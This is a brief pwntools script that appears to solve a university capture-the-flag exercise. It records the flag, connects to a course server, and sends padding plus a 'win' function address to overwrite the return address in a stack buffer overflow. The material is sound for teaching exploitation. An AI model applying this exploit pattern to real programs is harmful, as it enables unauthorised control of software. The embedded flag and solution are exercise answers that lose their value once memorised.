# SSof{Overflow_of_r37urn_address}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22154

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### interact with it
# win ptr 0x080486f1
win = b'\xf1\x86\x04\x08'
msg = b'A'*22 + win
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

s.interactive()

